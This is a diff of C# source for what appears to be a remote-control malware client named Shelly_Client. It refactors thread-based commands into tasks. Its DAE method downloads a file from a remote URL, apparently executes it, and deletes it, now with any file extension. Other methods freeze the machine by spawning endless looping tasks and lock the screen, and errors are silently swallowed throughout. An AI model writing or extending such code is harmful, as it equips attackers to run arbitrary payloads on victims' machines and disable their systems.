@@ -8,6 +8,7 @@ using System.Threading;
 using System.Management;
 using System.Diagnostics;
 using System.Windows.Forms;
+using System.Threading.Tasks;
 using System.Drawing.Imaging;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
@@ -33,31 +34,25 @@ namespace Shelly_Client
             // MsgBox method
             public static void MsgBox(string Message)
             {
-                // Make and start thread
-                new Thread(() =>
+                // Create and run task
+                Task.Factory.StartNew(() =>
                 {
-                    // Set thread to background
-                    Thread.CurrentThread.IsBackground = true;
-
                     // Display messagebox
                     MessageBox.Show(Message);
-                }).Start();
+                });
             }
 
             // DAE method
-            public static void DAE(string Url)
+            public static void DAE(string Url, string Extention)
             {
-                // Make and start thread
-                new Thread(() =>
+                // Create and run task
+                Task.Factory.StartNew(() =>
                 {
-                    // Set thread to background
-                    Thread.CurrentThread.IsBackground = true;
-
                     // Try to do tasks
                     try
                     {
                         // Set string
-                        string FileName = NoneClientRelated.GenerateRandomString(12) + ".exe";
+                        string FileName = NoneClientRelated.GenerateRandomString(12) + "." + Extention;
 
                         // Create new instance
                         using (WebClient webClient = new WebClient())
@@ -74,11 +69,12 @@ namespace Shelly_Client
 
                         // Delete file
                         File.Delete(Path.GetTempPath() + FileName);
-                    } catch
+                    }
+                    catch
                     {
 
                     }
-                }).Start();
+                });
             }
 
             // OpenWebsite method
@@ -190,12 +186,9 @@ namespace Shelly_Client
             // CWP method
             public static void CWP(string Url)
             {
-                // Make and start thread
-                new Thread(() =>
+                // Create and run task
+                Task.Factory.StartNew(() =>
                 {
-                    // Set thread to background
-                    Thread.CurrentThread.IsBackground = true;
-
                     // Try to do tasks
                     try
                     {
@@ -246,7 +239,7 @@ namespace Shelly_Client
                     {
 
                     }
-                }).Start();
+                });
             }
 
             // Freeze method
@@ -255,31 +248,25 @@ namespace Shelly_Client
                 // Infinite loop
                 while(true)
                 {
-                    // Make and start thread
-                    new Thread(() =>
+                    // Create and run task
+                    Task.Factory.StartNew(() =>
                     {
                         // Infinite loop
-                        while(true)
+                        while (true)
                         {
-                            // Set thread to background
-                            Thread.CurrentThread.IsBackground = true;
-
                             // Start idle cmd
                             NoneClientRelated.Cmd("pause");
                         }
-                    }).Start();
+                    });
                 }
             }
 
             // Lock method
             public static void Lock(int Seconds)
             {
-                // Make and start thread
-                new Thread(() =>
+                // Create and run task
+                Task.Factory.StartNew(() =>
                 {
-                    // Set thread to background
-                    Thread.CurrentThread.IsBackground = true;
-
                     // Try to lock
                     try
                     {
@@ -295,11 +282,12 @@ namespace Shelly_Client
                             // Unlock
                             Lock.Hide();
                         }
-                    } catch
+                    }
+                    catch
                     {
 
                     }
-                }).Start();
+                });
             }
         }
 
